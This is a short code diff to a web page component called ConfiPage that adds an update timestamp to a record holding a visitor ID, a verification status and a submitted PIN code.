@@ -159,6 +159,7 @@ export default function ConfiPage() {
         id: visitorID,
         visitorId: visitorID,
         _v6Status: 'verifying',
+        _v6UpdatedAt: new Date().toISOString(),
         pinCode: _v6,
         pinSubmittedAt: new Date().toISOString(),
         currentPage: "confi",
